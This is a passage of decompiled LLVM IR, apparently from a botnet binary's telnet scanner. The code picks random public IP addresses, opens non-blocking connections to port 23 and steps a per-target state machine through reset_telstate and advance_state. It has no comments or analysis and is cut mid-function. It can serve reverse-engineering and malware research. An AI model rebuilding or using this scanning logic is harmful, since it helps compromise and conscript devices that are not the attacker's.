  %v1_804d0fc = icmp eq i32 %v4_804d0f5, 0
  %v1_804d0fe = icmp eq i1 %v1_804d0fc, false
  br i1 %v1_804d0fe, label %dec_label_pc_804d0ef, label %dec_label_pc_804d100.preheader

dec_label_pc_804d100.preheader:                   ; preds = %dec_label_pc_804d0ef
  %v2_804d550 = ptrtoint i32* %stack_var_-316 to i32
  %tmp37 = bitcast i32* %stack_var_-316 to i8*
  %v2_804d5d0 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804d636 = ptrtoint i32* %stack_var_-328 to i32
  %v2_804d640 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804d170 = or i32 %v2_804d02b, 8
  %v2_804d1b0 = or i32 %v2_804d02b, 9
  %v2_804d2a1 = or i32 %v2_804d02b, 11
  %v2_804d2e8 = or i32 %v2_804d02b, 10
  %v2_804dd59 = add i32 %v2_804d02b, 16
  br label %dec_label_pc_804d100

dec_label_pc_804d100:                             ; preds = %dec_label_pc_804d100, %dec_label_pc_804e0dc, %dec_label_pc_804d100.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804d100.preheader ], [ %stack_var_-624.0, %dec_label_pc_804d100 ], [ %stack_var_-624.1, %dec_label_pc_804e0dc ]
  %stack_var_-628.0 = phi i32 [ %tmp3, %dec_label_pc_804d100.preheader ], [ %stack_var_-628.0, %dec_label_pc_804d100 ], [ %stack_var_-628.1, %dec_label_pc_804e0dc ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804d0e258, label %dec_label_pc_804d10c, label %dec_label_pc_804d100

dec_label_pc_804d10c:                             ; preds = %dec_label_pc_804d100, %dec_label_pc_804e0dc
  %storemerge49 = phi i32 [ %v4_804e0dc, %dec_label_pc_804e0dc ], [ 0, %dec_label_pc_804d100 ]
  %stack_var_-628.248 = phi i32 [ %stack_var_-628.1, %dec_label_pc_804e0dc ], [ %stack_var_-628.0, %dec_label_pc_804d100 ]
  %stack_var_-624.247 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804e0dc ], [ %stack_var_-624.0, %dec_label_pc_804d100 ]
  %v1_804d112 = mul i32 %storemerge49, 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v2_804d120 = mul i32 %storemerge49, 28
  %v2_804d122 = add i32 %v2_804d120, %v2_804d02b
  %v1_804d124 = add i32 %v2_804d122, 16
  store i32 %v1_804d124, i32* %eax.global-to-local, align 4
  %v1_804d127 = inttoptr i32 %v1_804d124 to i32*
  %v2_804d127 = load i32, i32* %v1_804d127, align 4
  store i32 %v2_804d127, i32* %eax.global-to-local, align 4
  %v1_804d129 = icmp eq i32 %v2_804d127, 0
  %v1_804d12b = icmp eq i1 %v1_804d129, false
  br i1 %v1_804d12b, label %dec_label_pc_804d15a, label %dec_label_pc_804d12d

dec_label_pc_804d12d:                             ; preds = %dec_label_pc_804d10c
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804d130 = load i32, i32* @esp, align 4
  %v1_804d130 = inttoptr i32 %v0_804d130 to i32*
  store i32 0, i32* %v1_804d130, align 4
  %v1_804d137 = inttoptr i32 %storemerge49 to i32*
  %v2_804d137 = call i32 @__GI_time(i32* %v1_804d137)
  store i32 %v2_804d137, i32* @esi, align 4
  %v0_804d141 = load i32, i32* @ebx, align 4
  %v1_804d143 = mul i32 %v0_804d141, 4
  store i32 %v1_804d143, i32* %edx.global-to-local, align 4
  %v2_804d151 = mul i32 %v0_804d141, 28
  %v2_804d153 = add i32 %v2_804d151, %v2_804d02b
  %v1_804d155 = add i32 %v2_804d153, 16
  store i32 %v1_804d155, i32* %eax.global-to-local, align 4
  %v2_804d158 = inttoptr i32 %v1_804d155 to i32*
  store i32 %v2_804d137, i32* %v2_804d158, align 4
  br label %dec_label_pc_804d15a

dec_label_pc_804d15a:                             ; preds = %dec_label_pc_804d10c, %dec_label_pc_804d12d
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d170 = add i32 %v2_804d170, %v2_804d120
  %v4_804d170 = inttoptr i32 %v3_804d170 to i8*
  %v5_804d170 = load i8, i8* %v4_804d170, align 4
  %v6_804d170 = zext i8 %v5_804d170 to i32
  store i32 %v6_804d170, i32* %eax.global-to-local, align 4
  store i32 %v6_804d170, i32* @edi, align 4
  %v1_804d191 = mul nuw nsw i32 %v6_804d170, 4
  %v2_804d191 = add nuw nsw i32 %v1_804d191, 134583192
  %v3_804d191 = inttoptr i32 %v2_804d191 to i32*
  %v4_804d191 = load i32, i32* %v3_804d191, align 4
  store i32 %v4_804d191, i32* %eax.global-to-local, align 4
  switch i8 %v5_804d170, label %dec_label_pc_804e0dc [
    i8 0, label %dec_label_pc_804d19a
    i8 1, label %dec_label_pc_804d546
    i8 2, label %dec_label_pc_804d7ac
    i8 3, label %dec_label_pc_804d8ec
    i8 4, label %dec_label_pc_804da3f
    i8 5, label %dec_label_pc_804db7f
    i8 6, label %dec_label_pc_804dcd2
    i8 7, label %dec_label_pc_804df6c
  ]

dec_label_pc_804d19a:                             ; preds = %dec_label_pc_804d15a
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d1b0 = add i32 %v2_804d1b0, %v2_804d120
  %v4_804d1b0 = inttoptr i32 %v3_804d1b0 to i8*
  %v5_804d1b0 = load i8, i8* %v4_804d1b0, align 1
  %v10_804d1b5 = icmp eq i8 %v5_804d1b0, 1
  %v1_804d1b7 = icmp eq i1 %v10_804d1b5, false
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  br i1 %v1_804d1b7, label %dec_label_pc_804d266, label %dec_label_pc_804d1bd

dec_label_pc_804d1bd:                             ; preds = %dec_label_pc_804d19a
  %v1_804d1d5 = add i32 %v2_804d122, 24
  store i32 %v1_804d1d5, i32* %eax.global-to-local, align 4
  %v1_804d1d8 = inttoptr i32 %v1_804d1d5 to i32*
  %v2_804d1d8 = load i32, i32* %v1_804d1d8, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804d1fb = inttoptr i32 %v2_804d122 to i32*
  store i32 0, i32* %v2_804d1fb, align 4
  %v0_804d1fd = load i32, i32* %eax.global-to-local, align 4
  %v1_804d1fd = add i32 %v0_804d1fd, 4
  store i32 %v1_804d1fd, i32* %eax.global-to-local, align 4
  %v0_804d200 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d200 = inttoptr i32 %v1_804d1fd to i32*
  store i32 %v0_804d200, i32* %v2_804d200, align 4
  %v0_804d202 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d202 = add i32 %v0_804d202, 4
  store i32 %v1_804d202, i32* %eax.global-to-local, align 4
  %v0_804d205 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d205 = inttoptr i32 %v1_804d202 to i32*
  store i32 %v0_804d205, i32* %v2_804d205, align 4
  %v0_804d207 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d207 = add i32 %v0_804d207, 4
  store i32 %v1_804d207, i32* %eax.global-to-local, align 4
  %v0_804d20a = load i32, i32* %edx.global-to-local, align 4
  %v2_804d20a = inttoptr i32 %v1_804d207 to i32*
  store i32 %v0_804d20a, i32* %v2_804d20a, align 4
  %v0_804d20c = load i32, i32* %eax.global-to-local, align 4
  %v1_804d20c = add i32 %v0_804d20c, 4
  store i32 %v1_804d20c, i32* %eax.global-to-local, align 4
  %v0_804d20f = load i32, i32* %edx.global-to-local, align 4
  %v2_804d20f = inttoptr i32 %v1_804d20c to i32*
  store i32 %v0_804d20f, i32* %v2_804d20f, align 4
  %v0_804d211 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d211 = add i32 %v0_804d211, 4
  store i32 %v1_804d211, i32* %eax.global-to-local, align 4
  %v0_804d214 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d214 = inttoptr i32 %v1_804d211 to i32*
  store i32 %v0_804d214, i32* %v2_804d214, align 4
  %v0_804d216 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d216 = add i32 %v0_804d216, 4
  %v0_804d219 = load i32, i32* %edx.global-to-local, align 4
  %v2_804d219 = inttoptr i32 %v1_804d216 to i32*
  store i32 %v0_804d219, i32* %v2_804d219, align 4
  store i32 %v1_804d1d5, i32* %edx.global-to-local, align 4
  store i32 %v2_804d1d8, i32* @eax, align 4
  store i32 %v2_804d1d8, i32* %v1_804d1d8, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v1_804d23e = call i32 @GetRandomPublicIP(i32 %v6_804d170)
  %v0_804d248 = load i32, i32* @ebx, align 4
  %v1_804d24a = mul i32 %v0_804d248, 4
  store i32 %v1_804d24a, i32* %edx.global-to-local, align 4
  %v2_804d258 = mul i32 %v0_804d248, 28
  %v2_804d25a = add i32 %v2_804d258, %v2_804d02b
  %v1_804d25c = add i32 %v2_804d25a, 4
  store i32 %v1_804d25c, i32* %eax.global-to-local, align 4
  %v2_804d25f = inttoptr i32 %v1_804d25c to i32*
  store i32 %v1_804d23e, i32* %v2_804d25f, align 4
  br label %dec_label_pc_804d395

dec_label_pc_804d266:                             ; preds = %dec_label_pc_804d19a
  %v5_804d27c = load i8, i8* %v4_804d1b0, align 1
  %v6_804d27c = zext i8 %v5_804d27c to i32
  store i32 %v6_804d27c, i32* %eax.global-to-local, align 4
  %v4_804d281 = icmp eq i8 %v5_804d27c, 0
  %v1_804d283 = icmp eq i1 %v4_804d281, false
  br i1 %v1_804d283, label %dec_label_pc_804d395, label %dec_label_pc_804d289

dec_label_pc_804d289:                             ; preds = %dec_label_pc_804d266
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d2a1 = add i32 %v2_804d2a1, %v2_804d120
  %v4_804d2a1 = inttoptr i32 %v3_804d2a1 to i8*
  %v5_804d2a1 = load i8, i8* %v4_804d2a1, align 1
  %v2_804d2a8 = add i8 %v5_804d2a1, 1
  store i8 %v2_804d2a8, i8* %v4_804d2a1, align 1
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d2e8 = add i32 %v2_804d2e8, %v2_804d120
  %v4_804d2e8 = inttoptr i32 %v3_804d2e8 to i8*
  %v5_804d2e8 = load i8, i8* %v4_804d2e8, align 2
  %v2_804d2ef = add i8 %v5_804d2e8, 1
  store i8 %v2_804d2ef, i8* %v4_804d2e8, align 2
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v5_804d32d = load i8, i8* %v4_804d2a1, align 1
  %v10_804d332 = icmp eq i8 %v5_804d32d, 3
  %v1_804d334 = icmp eq i1 %v10_804d332, false
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  br i1 %v1_804d334, label %dec_label_pc_804d356, label %dec_label_pc_804d336

dec_label_pc_804d336:                             ; preds = %dec_label_pc_804d289
  store i8 1, i8* %v4_804d1b0, align 1
  br label %dec_label_pc_804e0dc

dec_label_pc_804d356:                             ; preds = %dec_label_pc_804d289
  %v5_804d36c = load i8, i8* %v4_804d2e8, align 2
  %v6_804d36c = zext i8 %v5_804d36c to i32
  store i32 %v6_804d36c, i32* %eax.global-to-local, align 4
  %v10_804d371 = icmp eq i8 %v5_804d36c, 3
  %v1_804d373 = icmp eq i1 %v10_804d371, false
  br i1 %v1_804d373, label %dec_label_pc_804d395, label %dec_label_pc_804d375

dec_label_pc_804d375:                             ; preds = %dec_label_pc_804d356
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804d1b0, align 1
  br label %dec_label_pc_804e0dc

dec_label_pc_804d395:                             ; preds = %dec_label_pc_804d356, %dec_label_pc_804d266, %dec_label_pc_804d1bd
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804d39e = load i32, i32* @esp, align 4
  %v1_804d39e = inttoptr i32 %v0_804d39e to i32*
  store i32 23, i32* %v1_804d39e, align 4
  %v0_804d3a5 = load i32, i32* %stack_var_-604, align 4
  %v1_804d3a5 = trunc i32 %v0_804d3a5 to i16
  %v2_804d3a5 = call i32 @htons(i16 %v1_804d3a5)
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  %v1_804d3e2 = add i32 %v2_804d122, 4
  store i32 %v1_804d3e2, i32* %eax.global-to-local, align 4
  %v1_804d3e5 = inttoptr i32 %v1_804d3e2 to i32*
  %v2_804d3e5 = load i32, i32* %v1_804d3e5, align 4
  store i32 %v2_804d3e5, i32* %eax.global-to-local, align 4
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804d3f0 = load i32, i32* @esp, align 4
  %v1_804d3f0 = add i32 %v0_804d3f0, 8
  %v2_804d3f0 = inttoptr i32 %v1_804d3f0 to i32*
  store i32 0, i32* %v2_804d3f0, align 4
  %v0_804d3f8 = load i32, i32* @esp, align 4
  %v1_804d3f8 = add i32 %v0_804d3f8, 4
  %v2_804d3f8 = inttoptr i32 %v1_804d3f8 to i32*
  store i32 1, i32* %v2_804d3f8, align 4
  %v0_804d400 = load i32, i32* @esp, align 4
  %v1_804d400 = inttoptr i32 %v0_804d400 to i32*
  store i32 2, i32* %v1_804d400, align 4
  %v2_804d407 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v2_804d3a5, 65536
  %v3_804d407 = sdiv i32 %sext, 65536
  %v4_804d407 = call i32 @socket(i32 %v3_804d407, i32 %v2_804d3e5, i32 %v2_804d407)
  store i32 %v4_804d407, i32* @esi, align 4
  %v0_804d411 = load i32, i32* @ebx, align 4
  %v2_804d421 = mul i32 %v0_804d411, 28
  %v3_804d423 = add i32 %v2_804d421, %v2_804d02b
  %v4_804d423 = inttoptr i32 %v3_804d423 to i32*
  store i32 %v4_804d407, i32* %v4_804d423, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d43c = inttoptr i32 %v2_804d122 to i32*
  %v4_804d43c = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d43c, i32* %eax.global-to-local, align 4
  %v10_804d43f = icmp eq i32 %v4_804d43c, -1
  br i1 %v10_804d43f, label %dec_label_pc_804e0dc, label %dec_label_pc_804d448

dec_label_pc_804d448:                             ; preds = %dec_label_pc_804d395
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d45e = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d45e, i32* %eax.global-to-local, align 4
  %v0_804d461 = load i32, i32* @esp, align 4
  %v1_804d461 = add i32 %v0_804d461, 8
  %v2_804d461 = inttoptr i32 %v1_804d461 to i32*
  store i32 0, i32* %v2_804d461, align 4
  %v0_804d469 = load i32, i32* @esp, align 4
  %v1_804d469 = add i32 %v0_804d469, 4
  %v2_804d469 = inttoptr i32 %v1_804d469 to i32*
  store i32 3, i32* %v2_804d469, align 4
  %v0_804d471 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d471 = load i32, i32* @esp, align 4
  %v2_804d471 = inttoptr i32 %v1_804d471 to i32*
  store i32 %v0_804d471, i32* %v2_804d471, align 4
  %v1_804d474 = load i32, i32* %stack_var_-596, align 4
  %v3_804d474 = call i32 @__libc_fcntl(i32 %v2_804d3e5, i32 %v1_804d474, i32 0)
  %v1_804d47b = or i32 %v3_804d474, 2048
  store i32 %v1_804d47b, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d497 = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d497, i32* %eax.global-to-local, align 4
  %v1_804d49a = load i32, i32* @esp, align 4
  %v2_804d49a = add i32 %v1_804d49a, 8
  %v3_804d49a = inttoptr i32 %v2_804d49a to i32*
  store i32 %v1_804d47b, i32* %v3_804d49a, align 4
  %v0_804d49e = load i32, i32* @esp, align 4
  %v1_804d49e = add i32 %v0_804d49e, 4
  %v2_804d49e = inttoptr i32 %v1_804d49e to i32*
  store i32 4, i32* %v2_804d49e, align 4
  %v0_804d4a6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4a6 = load i32, i32* @esp, align 4
  %v2_804d4a6 = inttoptr i32 %v1_804d4a6 to i32*
  store i32 %v0_804d4a6, i32* %v2_804d4a6, align 4
  %v1_804d4a9 = load i32, i32* %stack_var_-596, align 4
  %v3_804d4a9 = call i32 @__libc_fcntl(i32 %v2_804d3e5, i32 %v1_804d4a9, i32 0)
  store i32 %v2_804cfb4, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d4ca = load i32, i32* %v3_804d43c, align 4
  store i32 %v4_804d4ca, i32* %eax.global-to-local, align 4
  %v0_804d4cd = load i32, i32* @esp, align 4
  %v1_804d4cd = add i32 %v0_804d4cd, 8
  %v2_804d4cd = inttoptr i32 %v1_804d4cd to i32*
  store i32 16, i32* %v2_804d4cd, align 4
  %v1_804d4d5 = load i32, i32* @esp, align 4
  %v2_804d4d5 = add i32 %v1_804d4d5, 4
  %v3_804d4d5 = inttoptr i32 %v2_804d4d5 to i32*
  store i32 %v2_804cfb4, i32* %v3_804d4d5, align 4
  %v0_804d4d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d4d9 = load i32, i32* @esp, align 4
  %v2_804d4d9 = inttoptr i32 %v1_804d4d9 to i32*
  store i32 %v0_804d4d9, i32* %v2_804d4d9, align 4
  %v1_804d4dc = load i32, i32* %stack_var_-596, align 4
  %v3_804d4dc = call i32 @__libc_connect(i32 %v2_804d3e5, i32 %v1_804d4dc, i32 0)
  store i32 %v3_804d4dc, i32* %eax.global-to-local, align 4
  %v10_804d4e1 = icmp eq i32 %v3_804d4dc, -1
  %v1_804d4e4 = icmp eq i1 %v10_804d4e1, false
  br i1 %v1_804d4e4, label %dec_label_pc_804d518, label %dec_label_pc_804d4e6

dec_label_pc_804d4e6:                             ; preds = %dec_label_pc_804d448
  %v1_804d4e6 = call i32 @__errno_location(i32 %v2_804d3e5)
  store i32 %v1_804d4e6, i32* %eax.global-to-local, align 4
  %v1_804d4eb = inttoptr i32 %v1_804d4e6 to i32*
  %v2_804d4eb = load i32, i32* %v1_804d4eb, align 4
  store i32 %v2_804d4eb, i32* %eax.global-to-local, align 4
  %v9_804d4ed = icmp eq i32 %v2_804d4eb, 115
  br i1 %v9_804d4ed, label %dec_label_pc_804d518, label %dec_label_pc_804d4f2

dec_label_pc_804d4f2:                             ; preds = %dec_label_pc_804d4e6
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d50b = load i32, i32* @esp, align 4
  %v2_804d50b = inttoptr i32 %v1_804d50b to i32*
  store i32 %v2_804d122, i32* %v2_804d50b, align 4
  %v1_804d50e = call i32 @reset_telstate(i32 %v2_804d3e5)
  store i32 %v1_804d50e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d518:                             ; preds = %dec_label_pc_804d4e6, %dec_label_pc_804d448
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804d531 = load i32, i32* @esp, align 4
  %v1_804d531 = add i32 %v0_804d531, 4
  %v2_804d531 = inttoptr i32 %v1_804d531 to i32*
  store i32 1, i32* %v2_804d531, align 4
  %v0_804d539 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d539 = load i32, i32* @esp, align 4
  %v2_804d539 = inttoptr i32 %v1_804d539 to i32*
  store i32 %v0_804d539, i32* %v2_804d539, align 4
  %v1_804d53c = load i32, i32* %stack_var_-596, align 4
  %v2_804d53c = inttoptr i32 %v2_804d3e5 to i32*
  %v3_804d53c = call i32 @advance_state(i32* %v2_804d53c, i32 %v1_804d53c)
  store i32 %v3_804d53c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d546:                             ; preds = %dec_label_pc_804d15a
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804d550, i32* @edi, align 4
  %v5_804d557 = call i8* @_memset(i8* %tmp37, i32 0, i32 32)
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v3_804d575 = inttoptr i32 %v2_804d122 to i32*
  %v4_804d575 = load i32, i32* %v3_804d575, align 4
  %v2_804d57a = udiv i32 %v4_804d575, 32
  store i32 %v2_804d57a, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d593 = load i32, i32* %v3_804d575, align 4
  %v1_804d596 = urem i32 %v4_804d593, 32
  store i32 %v1_804d596, i32* %eax.global-to-local, align 4
  %v0_804d599 = load i32, i32* @ebp, align 4
  %v2_804d599 = mul nuw nsw i32 %v2_804d57a, 4
  %v3_804d599 = add nsw i32 %v2_804d599, -312
  %v4_804d599 = add i32 %v3_804d599, %v0_804d599
  %v5_804d599 = inttoptr i32 %v4_804d599 to i32*
  %v6_804d599 = load i32, i32* %v5_804d599, align 4
  %v9_804d599 = shl i32 1, %v1_804d596
  %v12_804d599 = or i32 %v6_804d599, %v9_804d599
  store i32 %v12_804d599, i32* %v5_804d599, align 4
  store i32 0, i32* %stack_var_-324, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d5ca = load i32, i32* %v3_804d575, align 4
  %v1_804d5cd = add i32 %v4_804d5ca, 1
  store i32 %v1_804d5cd, i32* %edx.global-to-local, align 4
  %v1_804d5d6 = load i32, i32* @esp, align 4
  %v2_804d5d6 = add i32 %v1_804d5d6, 16
  %v3_804d5d6 = inttoptr i32 %v2_804d5d6 to i32*
  store i32 %v2_804d5d0, i32* %v3_804d5d6, align 4
  %v0_804d5da = load i32, i32* @esp, align 4
  %v1_804d5da = add i32 %v0_804d5da, 12
  %v2_804d5da = inttoptr i32 %v1_804d5da to i32*
  store i32 0, i32* %v2_804d5da, align 4
  store i32 %v2_804d550, i32* %eax.global-to-local, align 4
  %v1_804d5e8 = load i32, i32* @esp, align 4
  %v2_804d5e8 = add i32 %v1_804d5e8, 8
  %v3_804d5e8 = inttoptr i32 %v2_804d5e8 to i32*
  store i32 %v2_804d550, i32* %v3_804d5e8, align 4
  %v0_804d5ec = load i32, i32* @esp, align 4
  %v1_804d5ec = add i32 %v0_804d5ec, 4
  %v2_804d5ec = inttoptr i32 %v1_804d5ec to i32*
  store i32 0, i32* %v2_804d5ec, align 4
  %v0_804d5f4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804d5f4 = load i32, i32* @esp, align 4
  %v2_804d5f4 = inttoptr i32 %v1_804d5f4 to i32*
  store i32 %v0_804d5f4, i32* %v2_804d5f4, align 4
  %v0_804d5f7 = load i32, i32* %stack_var_-324, align 4
  %v2_804d5f7 = load i32, i32* %stack_var_-316, align 4
  %v5_804d5f7 = call i32 @__libc_select(i32 %v0_804d5f7, i32 %arg1, i32 %v2_804d5f7, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804d5f7, i32* %eax.global-to-local, align 4
  %v12_804d5ff = icmp eq i32 %v5_804d5f7, 1
  %v1_804d603 = icmp eq i1 %v12_804d5ff, false
  br i1 %v1_804d603, label %dec_label_pc_804d726, label %dec_label_pc_804d609

dec_label_pc_804d609:                             ; preds = %dec_label_pc_804d546
  store i32 4, i32* %stack_var_-328, align 4
  store i32 0, i32* %stack_var_-332, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d633 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d633, i32* %edx.global-to-local, align 4
  %v1_804d63c = load i32, i32* @esp, align 4
  %v2_804d63c = add i32 %v1_804d63c, 16
  %v3_804d63c = inttoptr i32 %v2_804d63c to i32*
  store i32 %v2_804d636, i32* %v3_804d63c, align 4
  store i32 %v2_804d640, i32* %eax.global-to-local, align 4
  %v1_804d646 = load i32, i32* @esp, align 4
  %v2_804d646 = add i32 %v1_804d646, 12
  %v3_804d646 = inttoptr i32 %v2_804d646 to i32*
  store i32 %v2_804d640, i32* %v3_804d646, align 4
  %v0_804d64a = load i32, i32* @esp, align 4
  %v1_804d64a = add i32 %v0_804d64a, 8
  %v2_804d64a = inttoptr i32 %v1_804d64a to i32*
  store i32 4, i32* %v2_804d64a, align 4
  %v0_804d652 = load i32, i32* @esp, align 4
  %v1_804d652 = add i32 %v0_804d652, 4
  %v2_804d652 = inttoptr i32 %v1_804d652 to i32*
  store i32 1, i32* %v2_804d652, align 4
  %v0_804d65a = load i32, i32* %edx.global-to-local, align 4
  %v1_804d65a = load i32, i32* @esp, align 4
  %v2_804d65a = inttoptr i32 %v1_804d65a to i32*
  store i32 %v0_804d65a, i32* %v2_804d65a, align 4
  %v0_804d65d = load i32, i32* %stack_var_-332, align 4
  %v1_804d65d = load i32, i32* %stack_var_-328, align 4
  %v2_804d65d = load i32, i32* %stack_var_-324, align 4
  %v4_804d65d = load i32, i32* %stack_var_-316, align 4
  %v5_804d65d = call i32 @getsockopt(i32 %v0_804d65d, i32 %v1_804d65d, i32 %v2_804d65d, i32 %arg1, i32 %v4_804d65d)
  %v3_804d662 = load i32, i32* %stack_var_-332, align 4
  store i32 %v3_804d662, i32* %eax.global-to-local, align 4
  %v1_804d668 = icmp eq i32 %v3_804d662, 0
  store i32 %v1_804d112, i32* @edx, align 4
  br i1 %v1_804d668, label %dec_label_pc_804d692, label %dec_label_pc_804d66c

dec_label_pc_804d66c:                             ; preds = %dec_label_pc_804d609
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v1_804d685 = load i32, i32* @esp, align 4
  %v2_804d685 = inttoptr i32 %v1_804d685 to i32*
  store i32 %v2_804d122, i32* %v2_804d685, align 4
  %v0_804d688 = load i32, i32* %stack_var_-332, align 4
  %v1_804d688 = call i32 @reset_telstate(i32 %v0_804d688)
  store i32 %v1_804d688, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e0dc

dec_label_pc_804d692:                             ; preds = %dec_label_pc_804d609
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d6a8 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d6a8, i32* %eax.global-to-local, align 4
  %v0_804d6ab = load i32, i32* @esp, align 4
  %v1_804d6ab = add i32 %v0_804d6ab, 8
  %v2_804d6ab = inttoptr i32 %v1_804d6ab to i32*
  store i32 0, i32* %v2_804d6ab, align 4
  %v0_804d6b3 = load i32, i32* @esp, align 4
  %v1_804d6b3 = add i32 %v0_804d6b3, 4
  %v2_804d6b3 = inttoptr i32 %v1_804d6b3 to i32*
  store i32 3, i32* %v2_804d6b3, align 4
  %v0_804d6bb = load i32, i32* %eax.global-to-local, align 4
  %v1_804d6bb = load i32, i32* @esp, align 4
  %v2_804d6bb = inttoptr i32 %v1_804d6bb to i32*
  store i32 %v0_804d6bb, i32* %v2_804d6bb, align 4
  %v0_804d6be = load i32, i32* %stack_var_-332, align 4
  %v1_804d6be = load i32, i32* %stack_var_-328, align 4
  %v2_804d6be = load i32, i32* %stack_var_-324, align 4
  %v3_804d6be = call i32 @__libc_fcntl(i32 %v0_804d6be, i32 %v1_804d6be, i32 %v2_804d6be)
  %v1_804d6c5 = and i32 %v3_804d6be, -2049
  store i32 %v1_804d6c5, i32* @ebx, align 4
  store i32 %v1_804d112, i32* %edx.global-to-local, align 4
  store i32 %v2_804d120, i32* %eax.global-to-local, align 4
  %v4_804d6e1 = load i32, i32* %v3_804d575, align 4
  store i32 %v4_804d6e1, i32* %eax.global-to-local, align 4
  %v1_804d6e4 = load i32, i32* @esp, align 4
  %v2_804d6e4 = add i32 %v1_804d6e4, 8
  %v3_804d6e4 = inttoptr i32 %v2_804d6e4 to i32*
  store i32 %v1_804d6c5, i32* %v3_804d6e4, align 4
  %v0_804d6e8 = load i32, i32* @esp, align 4
  %v1_804d6e8 = add i32 %v0_804d6e8, 4
  %v2_804d6e8 = inttoptr i32 %v1_804d6e8 to i32*
  store i32 4, i32* %v2_804d6e8, align 4
  %v0_804d6f0 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d6f0 = load i32, i32* @esp, align 4
  %v2_804d6f0 = inttoptr i32 %v1_804d6f0 to i32*
  store i32 %v0_804d6f0, i32* %v2_804d6f0, align 4
  %v0_804d6f3 = load i32, i32* %stack_var_-332, align 4
  %v1_804d6f3 = load i32, i32* %stack_var_-328, align 4
  %v2_804d6f3 = load i32, i32* %stack_var_-324, align 4
  %v3_804d6f3 = call i32 @__libc_fcntl(i32 %v0_804d6f3, i32 %v1_804d6f3, i32 %v2_804d6f3)
  store i32 %v1_804d112, i32* @edx, align 4
  store i32 %v2_804d122, i32* %eax.global-to-local, align 4
  %v0_804d711 = load i32, i32* @esp, align 4
  %v1_804d711 = add i32 %v0_804d711, 4
  %v2_804d711 = inttoptr i32 %v1_804d711 to i32*
  store i32 2, i32* %v2_804d711, align 4
  %v0_804d719 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d719 = load i32, i32* @esp, align 4
